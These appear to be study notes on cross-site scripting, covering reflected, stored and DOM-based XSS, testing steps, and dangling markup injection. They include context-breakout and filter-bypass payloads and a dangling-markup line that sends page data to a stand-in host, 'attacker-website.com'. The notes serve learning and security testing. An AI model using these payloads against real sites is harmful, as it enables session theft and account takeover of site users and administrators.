# What is XSS?
- A type of injection
- Attacker sends code through a web application
	- This is a client side script
- This is powerful because the victim's browser trusts and executes the script.
==There are endless types of attacks that XSS can lead to.==
Commonly examples: 
- Transmitting private data, like cookies or other session information - Redirecting the victim to web content controlled by the attacker
- Performing other malicious operations on the user’s machine under the guise of the vulnerable site.
- **XSS can be used to target regular users and also admins on the website, allowing full takeovers.**
## Defending against XSS
1.  [[CSP (Content Security Policy)]]
2. Cookie flags
3. Browser Security Headers
	- `X-Frame-Options`: Blocks [`<frame>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/frame), [`<iframe>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/iframe), [`<embed>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/embed) or [`<object>`](https://developer.mozilla.org/en-US/docs/Web/HTML/Reference/Elements/object), preventing clickjacking.
4. [[WAF (Web Application Firewall)]]
5. Client Side Validation
6. Server Side Validation
7. Output Encoding
	## Conditions for an XSS
8. Data enters a web application through an untrusted source. This is usually a URL or web request.
9. The data is dynamic content that is sent to a web user.
   > The data is usually JavaScript. However, it can be any type of code the browser can execute.
10. The data is not validated for malicious content.
# The 3 Types of XSS
## 1. Reflected XSS
### How does it arise?
- When an application receives data in an HTTP request 
  **AND** 
- ==Includes that data within the immediate response in an unsafe way==
>If the data being reflected is malicious, an attacker can execute client side code on a victim.
### Lifecycle
1. Victim sends a deceptive request to the server.
2. The victim's request is reflected back to them.
3. The reflection causes code to execute
4. The browser trusts this and runs it.
### Testing for Reflected XSS
1. Test all input entry points within HTTP requests.
	- Parameters in URL Query
	- URL file path
	- HTTP headers
2. Submit random alphanumeric values
	- For each entry point, submit a unique random value and determine whether the value is reflected in the response
	- 8 Random alphanumeric characters.
	- See if the input is reflected
   >This should not be something malicious, the goal is to test reflection, not protection.
3. Determine the context of the reflection
	- HTML tag
	- Tag attribute
	- JavaScript string
4. Test a candidate payload
	- Based on the context, test a payload
	- An efficient way to work is to leave the original random value in the request and place the candidate XSS payload before or after it. Then set the random value as the search term in Burp Repeater's response view. Burp will highlight each location where the search term appears, letting you quickly locate the reflection.
5. Test alternative payloads.
	- The payload may have been blocked or may have failed.
	- Iterate here to bypass all defences.
6. Test the attack in a browser.
	- Transfer the attack to a real browser (by pasting the URL into the address bar).
	- `alert(document.domain)` is a good payload.
## 2. Stored XSS
### How does it arise?
- When an application receives data in an HTTP request 
  **AND** 
- ==Stores that data==
  **AND** 
- ==Includes that data within a response in an unsafe way==
>If the data being reflected is malicious, an attacker can execute client side code on a victim.
### Lifecycle
1. Attacker sends a malicious request to the server.
2. Server saves the malicious data.
3. Victim sends a request to the server.
4. The server sends malicious data do the user.
5. The browser trusts this data and executes it.
### Testing for Stored XSS
1. **Identify all data entry points**
    - Parameters in URL query strings and message body
    - URL file paths
    - HTTP headers (may not be exploitable for reflected XSS, but still relevant)
    - Application-specific input: e.g.,
        - Comments on blog posts or forums
        - User profile fields (display name, bio, etc.)
        - Uploaded content metadata
        - External feeds (e.g., Twitter, news sources)
    - Out-of-band input routes (email in webmail, file uploads, etc.)
2. **Submit unique test values**
    - For each entry point, submit a unique alphanumeric string.
    - Recommended: 8 random alphanumeric characters.
    - Purpose: determine whether the submitted value is stored and later appears in the application.
3. **Locate stored data in responses**
    - Monitor the application over multiple requests to see if the test value reappears.
    - Check all user-accessible pages where stored data might appear:
        - Comments, profiles, feeds, dashboards, audit logs, etc.
    - Distinguish between immediate reflection (like reflected XSS) and stored data appearing across multiple requests.
4. **Determine the context of stored data**
    - Examine where the stored value is emitted in the response:
        - HTML tag body
        - HTML attribute
        - JavaScript string
        - CSS context
        - URL or other embedded contexts
    - This dictates the type of payload you will need.
5. **Test candidate payloads**
    - Use the original random value in the request as a marker.
    - Insert candidate XSS payload before or after it.
    - Use search functionality in tools like Burp Repeater to locate the stored value and context in responses.
    - Ensure the payload is appropriate for the identified context.
6. **Test alternative payloads**
    - Payloads may fail due to sanitization, encoding, or filters.
    - Iterate with variations to bypass defences.
    - Examples include breaking out of HTML attributes, escaping JavaScript strings, or using encoded variants.
7. **Validate the attack in a browser**
    - Trigger the stored XSS in a real browser session.
    - Example payload: `alert(document.domain)` to confirm execution.
    - Observe execution in different user roles if applicable (e.g., admin, guest).
8. **Consider edge cases**
    - Multi-step workflows where data is processed before storage
    - Conditional rendering based on user permissions or application state
    - Interactions with other stored entries (e.g., multiple comments affecting output)
## 3.  DOM-based XSS
### How does it arise?
- When an application receives data in an HTTP request 
  **AND** 
- ==Processes that data by writing it to the DOM==
  **AND** 
- ==Includes that data within a response in an unsafe way==
>If the data being reflected is malicious, an attacker can execute client side code on a victim.
### Lifecycle
1. Victim sends a deceptive request to the server.
2. Website processes the request client side in the DOM.
3. The browser executes malicious code.
### Example
The website uses this code:
```j
var search = document.getElementById('search').value; 
var results = document.getElementById('results'); 
results.innerHTML = 'You searched for: ' + search;
```
If the attacker searches for `<img src=1 onerror='/* Bad stuff here... */'>`, the website will parse this as: `You searched for: <img src=1 onerror='/* Bad stuff here... */'>`
### Testing for DOM-based XSS
1. **Identify all sources of attacker-controlled data**
    - `window.location` (URL: search/query string, hash, path)
    - `document.referrer`
    - `document.cookie`
    - Input fields processed by JavaScript without server-side checks
    - Data from third-party libraries/frameworks (e.g., jQuery, AngularJS)
    - Any client-side storage: `localStorage`, `sessionStorage`, IndexedDB
2. **Locate sinks for DOM-based XSS**
    - Dangerous DOM APIs or methods that execute code:
        - `document.write()`, `document.writeln()`
        - `element.innerHTML`, `element.outerHTML`
        - `element.insertAdjacentHTML()`
        - `element.onevent` attributes (onclick, onload, onerror)
        - `eval()`, `setTimeout()`, `setInterval()` (when passed strings)
    - jQuery sinks:
        - `html()`, `append()`, `prepend()`, `before()`, `after()`
        - `attr()`, `$()`, `animate()`
        - Other DOM manipulation functions (`wrap()`, `replaceWith()`, etc.)
    - Framework-specific sinks (AngularJS expressions in `{{ }}`)
3. **Test HTML sinks**
    - Place a unique random string in the source (e.g., `location.search`).
    - Use browser developer tools to inspect the live DOM (`Control+F` or `Command+F`) to locate the string.
    - Determine the context where it appears:
        - Inside an HTML tag
        - Inside an attribute (single- or double-quoted)
        - Inside JavaScript code
4. **Test JavaScript execution sinks**
    - Search page JavaScript for references to sources (e.g., `location.search`).
        - Chrome DevTools: `Control+Shift+F` / `Command+Alt+F`
    - Add breakpoints in the debugger to trace how the data propagates through variables.
    - Identify sinks where the source is eventually used.
    - Refine input to test if code execution is possible.
5. **Test third-party library sinks**
    - jQuery:
        - `$('#element').attr(...)` → check if user-controlled input can set attributes like `href`, `src`, or event handlers.
        - `$()` selector → check for DOM injection via user-controlled input.
    - AngularJS:
        - Check expressions in `{{ }}` or `ng-app` for user input usage.
6. **Submit candidate payloads**
    - HTML sinks:
        - Inject tags or attributes: `<img src=x onerror=alert(1)>`
    - `document.write()`:
        - `<script>alert(document.domain)</script>` (may need context adjustment)
    - jQuery sinks:
        - Malicious URLs in `href` or injected elements with events
    - AngularJS:
        - Malicious expressions inside double curly braces
7. **Refine and iterate**
    - Payloads may be blocked by:
        - URL-encoding
        - Browser sanitization
        - Framework restrictions
    - Iterate with variations to bypass filters.
8. **Test in the browser**
    - Trigger the sink in a real browser session.
    - Validate code execution (e.g., `alert(document.domain)`).
    - Test with multiple user roles if applicable.
9. **Consider combined XSS**
    - DOM-based XSS may combine with reflected or stored data:
        - Reflected DOM XSS: data comes from server response and is processed by JavaScript.
        - Stored DOM XSS: data stored on server is later used in a client-side sink.
10. **Edge cases**
    - Observe URL encoding differences across browsers (Chrome, Firefox, Safari).
    - Test hash-based navigation and events (`hashchange`) for injection.
    - Check multi-step workflows or dynamically loaded content.
# XSS Contexts
When testing for XSS an important task is identifying:
- The location within the response where attacker-controllable data appears.
- Any input validation or other processing that is being performed on that data by the application.
## Tricks
### HTML Attribute 
- We may be able to terminate out with:
	- `"><script>alert(document.domain)</script>`
	- Angle brackets may be encoded.  Provided you can terminate the attribute value, you can normally introduce a new attribute that creates a scriptable context, such as an event handler.
		- `" autofocus onfocus=alert(document.domain) x="`
		> The `x=` here gracefully repairs the rest of the code
- If the attribute can script, we can execute code without needing to escape the attribute:
	- `<a href="javascript:alert(document.domain)">`
### JavaScript String
- If the content is quoted inside a string literal, some useful ways of breaking out are:
```js
'-alert(document.domain)-' 
';alert(document.domain)//
```
- The `//` and `-` are there to repair the rest of the script

>Some applications prevent this by escaping `'` characters with a `\`
- We can counteract this with putting a `\` before the `'` to counteract their `\`. Ex:
	- The input `';alert(document.domain)//`  becomes `\';alert(document.domain)//`
	- If we input `\';alert(document.domain)//`, it turns into `\\';alert(document.domain)//`. Note that the `\\` do nothing.

### `<script>` Tag 
- If we are able to inject in something like:
 ```js
 <script>
 var input = 'controllable data';
 </script>
 ```
- Then you can use the following payload to break out of the existing JavaScript and execute your own:
	- `</script><img src=1 onerror=alert(document.domain)>` 
### HTML Event Handler
- When injected into an event handler attribute (e.g., `onclick`, `onfocus`, `onerror`), the content is executed as JavaScript.
- Browsers HTML-decode attributes before JS execution, which allows bypasses using encoded characters.
- For example: `<a href="#" onclick="... var input='controllable data here'; ...">`
	- If quotes are blocked, encode them: `&apos;-alert(document.domain)-&apos;`
	- `&apos;` → `'` (apostrophe) after HTML-decoding.
- **General strategy:**
	- Replace filtered characters with their HTML entities (`&apos;`, `&quot;`, `&#xNN;`, `&#NN;`).
	- Browser will decode them before execution, bypassing naive filters.
### JavaScript Template Literals
- Template literals are strings created with backticks.
- Any injected `${...}` block is ==evaluated as code== when the literal is processed.
- For example, ```var input = `controllable data here`;```
	- We can input `${alert(document.domain)}`
- **General strategy:**
	- Inject `${<payload>}` wherever you control input inside a backtick string.
	- Useful when single- or double-quote escaping blocks normal string-breaking attacks.
# Dangling Markup Injection
Dangling markup injection is a technique for capturing data cross-domain in situations where a full cross-site scripting attack isn't possible.
## Example
Suppose an application embeds attacker-controllable data into its responses in an unsafe way:
```js
<input type="text" name="input" value="CONTROLLABLE DATA HERE
```

Suppose also that the application does not filter or escape the `>` or `"` characters. An attacker can use the following syntax to break out of the quoted attribute value and the enclosing tag, and return to an HTML context: `">`

If an XSS is not possible due to filter, [[CSP (Content Security Policy)]], or a [[WAF (Web Application Firewall)]], a payload may be delivered:
```js
"><img src='//attacker-website.com?
```

The DOM will then read:
```js
<input type="text" name="input" value="CONTROLLABLE DATA HERE"><img src='//attacker-website.com?
```
# Useful Tools
- https://csp-evaluator.withgoogle.com/
	- Check how permissive a CSP is
- https://xss-payloads.paracyberbellum.io/payloads
	- [[WAF (Web Application Firewall)]] bypass payloads